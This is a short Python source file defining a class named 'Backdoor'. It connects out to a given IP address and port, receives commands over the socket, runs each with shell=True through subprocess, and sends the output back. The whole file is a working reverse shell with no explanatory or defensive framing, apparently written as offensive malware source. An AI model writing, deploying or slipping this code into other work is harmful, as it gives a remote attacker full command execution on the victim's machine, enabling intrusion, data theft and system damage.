import socket
import subprocess

class Backdoor:
    def __init__(self,ip,port):
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)   #(family,type)
        self.connection.connect((ip,port))


    def execute_system_command(self,command):
        return subprocess.check_output(command,shell=True)
    
    def run(self):
        self.connection.send("\n[+] Connection established.\n")
        while True:
           command=self.connection.recv(1024)
           command_result=self.execute_system_command(command)
           self.connection.send(command_result)
        self.connection.close()
